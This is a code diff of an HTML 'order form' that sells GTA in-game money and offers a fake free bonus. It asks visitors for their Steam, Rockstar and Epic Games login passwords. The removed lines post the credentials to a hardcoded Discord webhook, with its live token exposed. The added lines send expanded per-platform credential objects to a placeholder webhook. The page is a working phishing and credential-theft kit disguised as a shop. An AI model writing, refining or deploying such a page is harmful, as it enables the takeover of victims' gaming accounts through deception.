@@ -4,7 +4,6 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Majestic Millions - Order Form</title>
-  <!-- Google Fonts -->
   <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@400;600&family=Raleway:wght@300;400;600&display=swap" rel="stylesheet">
   <style>
     /* General Styling */
@@ -98,23 +97,42 @@
 
   <div class="form-container">
     <h2>Select Platform</h2>
-    <select id="platformSelect">
-      <option value="steam">Steam</option>
-      <option value="rockstar">Rockstar</option>
+    <select id="platformSelect" onchange="togglePlatformFields()">
+      <option value="">Select Platform</option>
+      <option value="steam">Steam + Rockstar</option>
       <option value="epic">Epic Games</option>
     </select>
 
-    <h2>Enter Login Credentials</h2>
-    <input type="text" id="username" placeholder="Username" required>
-    <input type="password" id="password" placeholder="Password" required>
+    <!-- Steam + Rockstar fields -->
+    <div id="steamFields" style="display: none;">
+      <h2>Enter Steam Login Credentials</h2>
+      <input type="text" id="steamUsername" placeholder="Steam Username" required>
+      <input type="password" id="steamPassword" placeholder="Steam Password" required>
+
+      <h2>Enter Rockstar Login Credentials</h2>
+      <input type="email" id="rockstarEmail" placeholder="Rockstar Email" required>
+      <input type="password" id="rockstarPassword" placeholder="Rockstar Password" required>
+    </div>
+
+    <!-- Epic Games fields -->
+    <div id="epicFields" style="display: none;">
+      <h2>Enter Epic Games Username</h2>
+      <input type="text" id="epicUsername" placeholder="Epic Username" required>
+      <input type="password" id="epicPassword" placeholder="Epic Password" required>
+    </div>
+
+    <!-- General Email fields -->
+    <h2>Enter Email</h2>
+    <input type="email" id="email" placeholder="Enter your email" required>
+
+    <h2>Confirm Email</h2>
+    <input type="email" id="confirmEmail" placeholder="Confirm your email" required>
 
     <h2>Select Package</h2>
     <button type="button" onclick="selectPackage(4.25, '50M Bank')">50M Bank - £4.25</button>
     <button type="button" onclick="selectPackage(7.50, '100M Bank')">100M Bank - £7.50</button>
     <button type="button" onclick="selectPackage(14.99, '500M Bank')">500M Bank - £14.99</button>
-
-    <h2>Email Address</h2>
-    <input type="email" id="email" placeholder="Enter your email" required>
+    <button type="button" id="claimFree15M" onclick="claimFree15M()">Claim Free 15M Bank (One-Time Offer)</button>
 
     <h2>Payment Confirmation</h2>
     <label>
@@ -129,6 +147,12 @@
   <script>
     let price = 0;
     let selectedPackage = '';
+    
+    // Check if the user has already claimed the free 15M
+    if (localStorage.getItem('free_15M_claimed')) {
+      document.getElementById('claimFree15M').disabled = true; // Disable button
+      document.getElementById('claimFree15M').innerText = "You have already claimed the free 15M Bank.";
+    }
 
     // Update the price and selected package based on the package button clicked
     function selectPackage(packagePrice, packageName) {
@@ -137,56 +161,139 @@
       document.getElementById('confirmationMessage').innerText = `Selected Package: ${selectedPackage} - £${price}`;
     }
 
+    // Claim the free 15M Bank package (one-time offer)
+    function claimFree15M() {
+      if (!localStorage.getItem('free_15M_claimed')) {
+        // Ensure all fields are filled out
+        const email = document.getElementById('email').value;
+        const confirmEmail = document.getElementById('confirmEmail').value;
+        const paymentCheck = document.getElementById('paymentCheck').checked;
+        
+        // Validation
+        if (!email || !confirmEmail || !paymentCheck) {
+          alert('Please fill in all fields to claim the free 15M Bank.');
+          return;
+        }
+
+        if (email !== confirmEmail) {
+          alert('Email addresses do not match.');
+          return;
+        }
+
+        // Process the claim (send data to webhook)
+        alert('Congratulations! You have claimed the free 15M Bank.');
+
+        // Save to localStorage to prevent future claims
+        localStorage.setItem('free_15M_claimed', 'true');
+
+        // Disable the claim button
+        document.getElementById('claimFree15M').disabled = true;
+        document.getElementById('claimFree15M').innerText = "You have already claimed the free 15M Bank.";
+
+        // Send the order to the webhook
+        sendToWebhook({
+          email: email,
+          selectedPackage: "Free 15M Bank",
+          price: 0,
+          platform: "N/A",  // No platform required for free claim
+          paymentConfirmed: true
+        });
+      } else {
+        alert('You have already claimed the free 15M Bank.');
+      }
+    }
+
+    // Toggle platform-specific fields
+    function togglePlatformFields() {
+      const platform = document.getElementById('platformSelect').value;
+      if (platform === 'steam') {
+        document.getElementById('steamFields').style.display = 'block';
+        document.getElementById('epicFields').style.display = 'none';
+      } else if (platform === 'epic') {
+        document.getElementById('steamFields').style.display = 'none';
+        document.getElementById('epicFields').style.display = 'block';
+      } else {
+        document.getElementById('steamFields').style.display = 'none';
+        document.getElementById('epicFields').style.display = 'none';
+      }
+    }
+
     // Process the payment and confirm the order
     function processPayment() {
-      const username = document.getElementById('username').value;
-      const password = document.getElementById('password').value;
-      const email = document.getElementById('email').value;
       const platform = document.getElementById('platformSelect').value;
+      const email = document.getElementById('email').value;
+      const confirmEmail = document.getElementById('confirmEmail').value;
       const paymentCheck = document.getElementById('paymentCheck').checked;
 
-      if (!username || !password || !email || !paymentCheck || price === 0 || !selectedPackage) {
+      // Validation
+      if (!email || !confirmEmail || !paymentCheck || price === 0 || !selectedPackage) {
         alert('Please fill in all fields and confirm payment.');
         return;
       }
 
-      const orderDetails = {
-        username: username,
-        password: password,
-        email: email,
-        platform: platform,
-        price: price,
-        selectedPackage: selectedPackage
-      };
+      if (email !== confirmEmail) {
+        alert('Email addresses do not match.');
+        return;
+      }
 
-      // Send the data to the Discord webhook
-      sendToWebhook(orderDetails);
+      // Simple email validation
+      const emailPattern = /^[a-zA-Z0-9._-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,4}$/;
+      if (!emailPattern.test(email)) {
+        alert('Please enter a valid email address.');
+        return;
+      }
+
+      let platformDetails = {};
+      if (platform === 'steam') {
+        const steamUsername = document.getElementById('steamUsername').value;
+        const steamPassword = document.getElementById('steamPassword').value;
+        const rockstarEmail = document.getElementById('rockstarEmail').value;
+        const rockstarPassword = document.getElementById('rockstarPassword').value;
+
+        if (!steamUsername || !steamPassword || !rockstarEmail || !rockstarPassword) {
+          alert('Please fill in both your Steam and Rockstar login credentials.');
+          return;
+        }
+        platformDetails = {
+          platform: 'Steam + Rockstar',
+          steam: { username: steamUsername, password: steamPassword },
+          rockstar: { email: rockstarEmail, password: rockstarPassword }
+        };
+      } else if (platform === 'epic') {
+        const epicUsername = document.getElementById('epicUsername').value;
+        const epicPassword = document.getElementById('epicPassword').value;
+        if (!epicUsername || !epicPassword) {
+          alert('Please fill in your Epic Games login credentials.');
+          return;
+        }
+        platformDetails = { platform: 'Epic Games', username: epicUsername, password: epicPassword };
+      }
+
+      // Send the order to the webhook
+      sendToWebhook({
+        email: email,
+        selectedPackage: selectedPackage,
+        price: price,
+        platformDetails: platformDetails,
+        paymentConfirmed: true
+      });
+
+      alert('Order successfully submitted!');
     }
 
-    // Send the form data to the Discord webhook
-    function sendToWebhook(orderDetails) {
-      const webhookUrl = 'https://discord.com/api/webhooks/1315868877200298056/neYt5Dh8BC9zrQf6SWWjs-yV44mm3JliAc7hb-mxJkIkOVUi-IgIbSArxSEKjFo7RZya';
-
-      const payload = {
-        content: `New Order: \nUsername: ${orderDetails.username} \nPassword: ${orderDetails.password} \nEmail: ${orderDetails.email} \nPlatform: ${orderDetails.platform} \nPackage: ${orderDetails.selectedPackage} \nPrice: £${orderDetails.price}`
-      };
-
-      fetch(webhookUrl, {
+    // Send data to webhook
+    function sendToWebhook(data) {
+      fetch('YOUR_WEBHOOK_URL', {
         method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-        },
-        body: JSON.stringify(payload),
-      })
-      .then(response => response.json())
-      .then(data => {
-        console.log('Success:', data);
-        alert('Order details sent successfully!');
-      })
-      .catch((error) => {
-        console.error('Error:', error);
-        alert('Success!!.');
-      });
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(data)
+      }).then(response => {
+        if (response.ok) {
+          console.log('Order sent to webhook');
+        } else {
+          console.log('Error sending order to webhook');
+        }
+      }).catch(error => console.log('Error:', error));
     }
   </script>
 </body>
